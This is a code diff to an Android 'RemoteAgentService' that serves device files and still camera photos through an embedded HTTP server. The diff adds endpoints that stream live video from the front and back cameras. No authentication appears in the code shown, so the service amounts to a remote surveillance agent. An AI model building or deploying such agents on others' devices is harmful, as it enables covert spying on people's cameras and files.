@@ -1,6 +1,6 @@
 package com.example.alex
 
-import android.annotation.SuppressLint
+
 import android.app.Notification
 import android.app.NotificationChannel
 import android.app.NotificationManager
@@ -9,32 +9,25 @@ import android.content.Intent
 import android.os.Build
 import android.os.IBinder
 import android.os.Environment
-import android.view.Surface
-import androidx.camera.core.ImageCapture
-import androidx.camera.core.ImageCaptureException
 import androidx.core.app.NotificationCompat
 import androidx.core.content.ContextCompat
 import fi.iki.elonen.NanoHTTPD
 import fi.iki.elonen.NanoHTTPD.newChunkedResponse
 import fi.iki.elonen.NanoHTTPD.newFixedLengthResponse
-import java.io.ByteArrayInputStream
 import java.io.File
 import java.io.FileInputStream
 import java.net.URLConnection
-import java.util.concurrent.TimeUnit
-import androidx.camera.core.CameraSelector
-import androidx.camera.lifecycle.ProcessCameraProvider
-import androidx.camera.core.*
 import java.util.concurrent.CountDownLatch
-import androidx.lifecycle.ProcessLifecycleOwner
-import androidx.camera.core.*
 import java.util.concurrent.Executors
-import android.app.*
 import android.content.Context
 import android.hardware.camera2.*
 import android.media.ImageReader
 import android.os.Handler
 import android.os.HandlerThread
+import android.content.pm.PackageManager
+import android.graphics.ImageFormat
+import java.io.PipedInputStream
+import java.io.PipedOutputStream
 
 
 
@@ -57,6 +50,8 @@ class RemoteAgentService : Service() {
                     session.uri.startsWith("/files") -> handleFileList(session)
                     session.uri == "/capture/front" -> captureCameraImage(CameraCharacteristics.LENS_FACING_FRONT)
                     session.uri == "/capture/back" -> captureCameraImage(CameraCharacteristics.LENS_FACING_BACK)
+                    session.uri == "/video/front" -> streamCameraVideo(CameraCharacteristics.LENS_FACING_FRONT)
+                    session.uri == "/video/back" -> streamCameraVideo(CameraCharacteristics.LENS_FACING_BACK)
                     session.uri == "/status" -> newFixedLengthResponse("OK: ${System.currentTimeMillis()}")
                     else -> newFixedLengthResponse(
                         Response.Status.OK,
@@ -67,6 +62,8 @@ class RemoteAgentService : Service() {
                             <li><a href='/files'>📁 Browse Files</a></li>
                             <li><a href='/capture/front'>🤳 Front Camera</a></li>
                             <li><a href='/capture/back'>📸 Back Camera</a></li>
+                             <li><a href='/video/front'>🤳 Front Video Camera</a></li>
+                            <li><a href='/video/back'>📸 Back Video Camera</a></li>
                         </ul>
                     """.trimIndent()
                     )
@@ -109,52 +106,6 @@ class RemoteAgentService : Service() {
         val mime = URLConnection.guessContentTypeFromName(target.name) ?: "application/octet-stream"
         val inputStream = FileInputStream(target)
         return newChunkedResponse(NanoHTTPD.Response.Status.OK, mime, inputStream)
-    }
-
-    private fun captureImage(front: Boolean, callback: (ByteArray?) -> Unit) {
-        val cameraProviderFuture = ProcessCameraProvider.getInstance(this)
-
-        cameraProviderFuture.addListener({
-            try {
-                val cameraProvider = cameraProviderFuture.get()
-                val imageCapture = ImageCapture.Builder()
-                    .setTargetRotation(Surface.ROTATION_0)
-                    .build()
-
-                val cameraSelector = if (front)
-                    CameraSelector.DEFAULT_FRONT_CAMERA
-                else
-                    CameraSelector.DEFAULT_BACK_CAMERA
-
-                // Bind to lifecycle safely
-                cameraProvider.unbindAll()
-                cameraProvider.bindToLifecycle(
-                    ProcessLifecycleOwner.get(),  // requires lifecycle-runtime dependency
-                    cameraSelector,
-                    imageCapture
-                )
-
-                val file = File(externalCacheDir, "capture_${System.currentTimeMillis()}.jpg")
-                val outputOptions = ImageCapture.OutputFileOptions.Builder(file).build()
-
-                imageCapture.takePicture(
-                    outputOptions,
-                    ContextCompat.getMainExecutor(this),
-                    object : ImageCapture.OnImageSavedCallback {
-                        override fun onError(exc: ImageCaptureException) {
-                            callback(null)
-                        }
-
-                        override fun onImageSaved(output: ImageCapture.OutputFileResults) {
-                            val bytes = file.readBytes()
-                            callback(bytes)
-                        }
-                    }
-                )
-            } catch (e: Exception) {
-                callback(null)
-            }
-        }, ContextCompat.getMainExecutor(this))
     }
 
     private fun captureCameraImage(lensFacing: Int): NanoHTTPD.Response {
@@ -217,7 +168,16 @@ class RemoteAgentService : Service() {
                 }
             }
 
-            cameraManager.openCamera(cameraId, stateCallback, handler)
+            try {
+                cameraManager.openCamera(cameraId, stateCallback, handler)
+            } catch (e: SecurityException) {
+                e.printStackTrace()
+                return NanoHTTPD.newFixedLengthResponse(
+                    NanoHTTPD.Response.Status.FORBIDDEN,
+                    "text/plain",
+                    "Camera access denied"
+                )
+            }
             resultLatch.await() // wait for image capture
         } catch (e: Exception) {
             e.printStackTrace()
@@ -232,6 +192,112 @@ class RemoteAgentService : Service() {
             )
         else
             NanoHTTPD.newFixedLengthResponse(NanoHTTPD.Response.Status.INTERNAL_ERROR, "text/plain", "Failed to capture image")
+    }
+
+    private fun streamCameraVideo(lensFacing: Int): NanoHTTPD.Response {
+        // Check CAMERA permission
+        if (ContextCompat.checkSelfPermission(this, android.Manifest.permission.CAMERA)
+            != PackageManager.PERMISSION_GRANTED
+        ) {
+            return NanoHTTPD.newFixedLengthResponse(
+                NanoHTTPD.Response.Status.FORBIDDEN,
+                "text/plain",
+                "Camera permission not granted"
+            )
+        }
+
+        val pipeInput = PipedInputStream()
+        val pipeOutput = PipedOutputStream(pipeInput)
+
+        // Start background thread for streaming
+        Executors.newSingleThreadExecutor().execute {
+            val cameraManager = getSystemService(Context.CAMERA_SERVICE) as CameraManager
+            val handlerThread = HandlerThread("MJPEGCameraThread").apply { start() }
+            val handler = Handler(handlerThread.looper)
+
+            try {
+                val cameraId = cameraManager.cameraIdList.first { id ->
+                    val chars = cameraManager.getCameraCharacteristics(id)
+                    chars.get(CameraCharacteristics.LENS_FACING) == lensFacing
+                }
+
+                val reader = ImageReader.newInstance(320, 240, ImageFormat.JPEG, 2)
+
+                val stateCallback = object : CameraDevice.StateCallback() {
+                    override fun onOpened(camera: CameraDevice) {
+                        try {
+                            val request = camera.createCaptureRequest(CameraDevice.TEMPLATE_PREVIEW)
+                            request.addTarget(reader.surface)
+
+                            camera.createCaptureSession(listOf(reader.surface),
+                                object : CameraCaptureSession.StateCallback() {
+                                    override fun onConfigured(session: CameraCaptureSession) {
+                                        reader.setOnImageAvailableListener({ r ->
+                                            val img = r.acquireLatestImage() ?: return@setOnImageAvailableListener
+                                            val buffer = img.planes[0].buffer
+                                            val bytes = ByteArray(buffer.remaining())
+                                            buffer.get(bytes)
+                                            img.close()
+
+                                            try {
+                                                pipeOutput.write("--frame\r\nContent-Type: image/jpeg\r\nContent-Length: ${bytes.size}\r\n\r\n".toByteArray())
+                                                pipeOutput.write(bytes)
+                                                pipeOutput.write("\r\n".toByteArray())
+                                                pipeOutput.flush()
+                                            } catch (_: Exception) {
+                                                camera.close()
+                                                handlerThread.quitSafely()
+                                            }
+                                        }, handler)
+
+                                        session.setRepeatingRequest(request.build(), null, handler)
+                                    }
+
+                                    override fun onConfigureFailed(session: CameraCaptureSession) {
+                                        session.close()
+                                        camera.close()
+                                        handlerThread.quitSafely()
+                                    }
+                                }, handler
+                            )
+                        } catch (se: SecurityException) {
+                            se.printStackTrace()
+                            pipeOutput.close()
+                            handlerThread.quitSafely()
+                        }
+                    }
+
+                    override fun onDisconnected(camera: CameraDevice) {
+                        camera.close()
+                        handlerThread.quitSafely()
+                    }
+
+                    override fun onError(camera: CameraDevice, error: Int) {
+                        camera.close()
+                        handlerThread.quitSafely()
+                    }
+                }
+
+                try {
+                    cameraManager.openCamera(cameraId, stateCallback, handler)
+                } catch (se: SecurityException) {
+                    se.printStackTrace()
+                    pipeOutput.close()
+                }
+
+            } catch (e: Exception) {
+                e.printStackTrace()
+                pipeOutput.close()
+                handlerThread.quitSafely()
+            }
+        }
+
+        // Return the InputStream to NanoHTTPD for chunked response
+        return NanoHTTPD.newChunkedResponse(
+            NanoHTTPD.Response.Status.OK,
+            "multipart/x-mixed-replace; boundary=frame",
+            pipeInput
+        )
     }
 
 
